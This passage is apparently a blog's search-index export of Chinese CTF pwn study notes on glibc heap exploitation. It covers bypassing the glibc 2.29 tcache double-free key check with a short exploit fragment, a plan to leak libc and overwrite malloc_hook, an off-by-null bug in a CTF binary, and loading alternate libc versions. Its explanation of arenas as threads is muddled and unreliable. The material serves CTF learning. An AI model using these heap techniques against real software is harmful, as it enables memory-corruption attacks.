-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x70</span> [  <span class="hljs-number">1</span>]: <span class="hljs-number">0x55e9c994c260</span> ◂— <span class="hljs-number">0x0</span> <span class="hljs-comment">//说明0x70大小的Tcache里只有一个Tcache chunk，</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">562</span>fcfd<span class="hljs-number">39000</span><br><span class="hljs-attribute">0x562fcfd39000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000251</span><br><span class="hljs-attribute">0x562fcfd39010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000010000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39050</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39060</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39070</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000562</span>fcfd<span class="hljs-number">39260</span><br><br></code></pre></td></tr></table></figure>
-
-<p>这是控制堆块的部分结构</p>
-<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>
-<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>
-<blockquote>
-<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>
-</blockquote>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">56533012</span>f<span class="hljs-number">250</span><br><span class="hljs-attribute">0x56533012f250</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000071</span><br><span class="hljs-attribute">0x56533012f260</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">000056533012</span>f<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
-
-<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>
-<h4 id="2-29下Tcahce-double-free的检测"><a href="#2-29下Tcahce-double-free的检测" class="headerlink" title="2.29下Tcahce double free的检测"></a>2.29下Tcahce double free的检测</h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>
-<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//链表指针，对应chunk中的fd字段</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span>  <span class="hljs-comment">//指向所属的tcache结构体，对应chunk中的bk字段</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>
-
-
-
-<p>也就是所谓的key对应的就是chunk的bk字段。</p>
-<p>当chunk被free，放入Tcache链表时，操作如下。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"> <br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span><span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);<br> <br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;  <span class="hljs-comment">//设置所属的tcache</span><br> <br>  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//单链表头插法</span><br>  tcache-&gt;entries[tc_idx] = e;  <br> <br>  ++(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">//计数增加</span><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>然后进行free操作</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>
-<p>大致是</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;aaaa&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-
-<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>
-<p>然后我们需要构造出unsortedbin chunk、</p>
-<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>
-<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>
-<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>
-<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>
-<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>
-<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>
-<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>
-<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/A951860555/article/details/116910945">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>
-<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>
-<p><a href="https://www.bilibili.com/video/BV1Sy4y1W7h2">CISCN2021 lonelywolf</a></p>
-]]></content>
-      <tags>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu加载不同版本libc</title>
-    <url>/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="1）review"><a href="#1）review" class="headerlink" title="1）review"></a>1）review</h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>
-<p>然后我就是这样一步一步地变得不会调试的。</p>
-<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>
-<p>呜呜呜，我居然一直忽略了它的灵魂</p>
-<p>所以这一次我一定要解决掉这个问题。</p>
-<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>
-<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>
-<h4 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>
-<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>
-<h5 id="1）LD-PRELOAD"><a href="#1）LD-PRELOAD" class="headerlink" title="1）LD_PRELOAD"></a>1）LD_PRELOAD</h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;</code></p>
-<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>
-<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
-<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>
-<h5 id="2）LD-LIBRARY-PATH和LIBRARY-PATH"><a href="#2）LD-LIBRARY-PATH和LIBRARY-PATH" class="headerlink" title="2）LD_LIBRARY_PATH和LIBRARY_PATH"></a>2）LD_LIBRARY_PATH和LIBRARY_PATH</h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>
-<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>
-<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>
-<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>
-<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>
-<h5 id="1）-PT-INTERP"><a href="#1）-PT-INTERP" class="headerlink" title="1） PT_INTERP"></a>1） PT_INTERP</h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>
-<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>
-<h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>
-<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>
-<h4 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h4><p>我们以lonelywolf为例。</p>
-<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/net66/p/5609026.html"><a href="https://www.cnblogs.com/net66/p/5609026.html">LD_PRELOAD的偷梁换柱之能</a></a></p>
-]]></content>
-      <tags>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2021/08/16/Heap_Unsorted%20bin/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Tcache利用</title>
-    <url>/2021/08/13/Heap-Tcache%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h3 id="Tcache-利用"><a href="#Tcache-利用" class="headerlink" title="Tcache 利用"></a>Tcache 利用</h3><p>不是学习不是学习不是学习，</p>
-<p>例题是lctf2018的easyheap。</p>
-<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>
-<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">sub_BEC</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a2 )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      read(<span class="hljs-number">0</span>, &amp;a1[v3], <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( a2 - <span class="hljs-number">1</span> &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 || !a1[v3] || a1[v3] == <span class="hljs-number">10</span> )<br>        <span class="hljs-keyword">break</span>;<br>      ++v3;<br>    &#125;<br>    a1[v3] = <span class="hljs-number">0</span>;<br>    a1[a2] = <span class="hljs-number">0</span>;<span class="hljs-comment">//loophole</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a1 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>
-<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>
-<p>包括ciscn lonelywolf也是利用到了这一点。</p>
-]]></content>
-      <tags>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>main_arena与多线程</title>
-    <url>/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
-    <content><![CDATA[<p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>
-<blockquote>
-<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>
-</blockquote>
-<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>
-<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>
-<h4 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>
-<h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>
-<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>
-<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>
-<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>
-<blockquote>
-<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>
-</blockquote>
-<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>
-<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/24909781">malloc x 线程</a></p>
-<p><a href="https://www.wangan.com/docs/1741">GLibcHeap</a></p>
-]]></content>
-      <tags>
-        <tag>heap</tag>
       </tags>
   </entry>
 </search>
